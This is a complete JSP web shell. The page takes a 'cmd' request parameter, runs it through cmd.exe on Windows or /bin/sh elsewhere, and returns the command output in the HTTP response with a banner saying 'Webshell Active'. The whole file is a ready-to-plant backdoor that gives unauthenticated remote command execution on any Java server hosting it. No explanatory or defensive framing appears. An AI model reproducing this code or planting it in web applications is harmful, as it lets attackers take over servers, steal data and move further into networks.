<%@ page language="java" contentType="text/plain; charset=UTF-8" pageEncoding="UTF-8" %>
    <%@ page import="java.io.*" %>
        <% String cmd=request.getParameter("cmd"); if (cmd !=null) { try { Process p; if
            (System.getProperty("os.name").toLowerCase().contains("win")) { p=Runtime.getRuntime().exec(new
            String[]{"cmd.exe", "/c" , cmd}); } else { p=Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c" , cmd});
            } BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8" )); // Add UTF-8
            String line; while ((line=br.readLine()) !=null) { out.println(line); } br.close(); } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    } else {
        out.println(" Webshell Active. Usage: ?cmd=whoami"); } %>